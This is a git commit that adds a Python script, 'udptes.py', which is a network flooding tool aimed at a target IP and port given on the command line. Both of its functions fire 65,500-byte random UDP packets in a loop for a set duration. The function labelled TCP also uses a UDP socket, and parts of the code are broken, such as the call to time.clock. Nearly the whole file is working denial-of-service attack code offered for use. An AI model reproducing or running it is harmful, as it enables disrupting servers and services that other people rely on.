8b3289b99b0d058f48dfae2a0847c4b8893ba301
ROLLS-GAMING <105676069+ROLLS-GAMING@users.noreply.github.com>
2022-05-27 11:04:33 +0700

    Add files via upload

---
+++ udptes.py
@@ -0,0 +1,44 @@
+#!/usr/bin/python
+import socket
+import random
+import sys
+import time
+import os
+ 
+def UDPFlood():
+    port = int(sys.argv[2])
+    randport=(True,False)
+    ip = sys.argv[1]
+    dur = int(sys.argv[3])
+    clock=(lambda:0,time.clock)[dur>0]
+    duration=(1,(clock()+dur))[dur>0]
+    print('Eclipse-UDP: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    bytes=random._urandom(65500)
+    while True:
+        port=(random.randint(1,15000000),port)[randport]
+        if clock()<duration:
+            sock.sendto(bytes,(ip,port))
+        else:
+            break
+    print('DONE')
+UDPFlood()
+
+def TCP():
+    port = int(sys.argv[2])
+    randport=(True,False)
+    ip = sys.argv[1]
+    dur = int(sys.argv[3])
+    clock=(lambda:0,time.clock)[dur>0]
+    duration=(1,(clock()+dur))[dur>0]
+    print('Eclipse-TCP: %s:%s for %s seconds'%(ip,port,dur or 'infinite'))
+    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    bytes=random._urandom(65500)
+    while True:
+        port=(random.randint(1,15000000),port)[randport]
+        if clock()<duration:
+            sock.sendto(bytes,(ip,port))
+        else:
+            break
+    print('ATTACK TO SERVER TARGET')
+TCP()
